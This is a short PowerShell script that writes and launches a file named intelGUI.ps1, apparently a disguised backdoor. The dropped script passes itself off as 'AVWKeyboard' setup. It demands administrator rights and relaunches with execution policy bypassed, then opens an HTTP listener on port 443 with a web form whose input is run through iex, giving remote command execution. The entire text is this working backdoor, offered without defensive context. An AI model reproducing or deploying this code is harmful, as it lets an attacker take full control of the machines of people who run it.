$(
$scr = "
`$priv = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent());
if (-not `$priv.IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
{
    Write-Host ""[error] you need administrator privelage to setup AVWKeyboard"" -ForegroundColor white -BackgroundColor DarkRed;
    sleep 1;
    Start-Process -Verb runas -FilePath ""powershell.exe"" -ArgumentList ""-executionpolicy bypass -nologo -noexit -noprofile -file `$((pwd).path)/intelGUI.ps1"";
    exit;
};

function response (`$text)
{
    [byte[]] `$b = [System.Text.Encoding]::UTF8.GetBytes(""`$text"");
    `$res.ContentLength64 = `$b.Length;
    `$out = `$res.OutputStream;
    `$out.Write(`$b, 0, `$b.Length);
    `$out.Close();
};

function getres {
    `$bi = `$req.ContentLength64 + 1;
    `$buffer = New-Object byte[] `$bi;
    `$i=9;
    `$s=2;
    while (`$i -gt `$s)
    {
        `$i = `$req.InputStream.Read(`$buffer, 0 ,`$bi);
        `$s = `$bi;
        `$result = `$req.ContentEncoding.GetString(`$buffer, 0, `$i);
    };
    `$result;
};
`$listn = New-Object System.Net.HttpListener;
`$listn.Prefixes.Add(""http://192.168.43.150:443/"");
`$listn.start();
while (`$true)
{
	`$cont = `$listn.getcontext();
	`$req = `$cont.request;
	`$res = `$cont.response;
	if (`$req.httpmethod -eq ""GET"")
	{
		response -text ""<html><head><style>.form {background-color:gray;} <title>ssst</title></head><body bgcolor=black text=green>`$res<br /><form method=post action=ref><input type=text name=cmd /><input type=submit value=go /></form></body></html>"";
		
	} elseif (`$req.httpmethod -eq ""POST"")
	{
		if (`$req.rawurl -eq ""/ref"")
		{
			`$cmd = getres;
			`$cmd = `$cmd -replace ('+',' ');
			`$cmd = `$cmd -replace ('%40','@');
			try {
				`$res = iex `$cmd;
			} catch {
				`$res = `$_;
			};
		};
	};
};
";
sc ./intelGUI.ps1 $scr;
)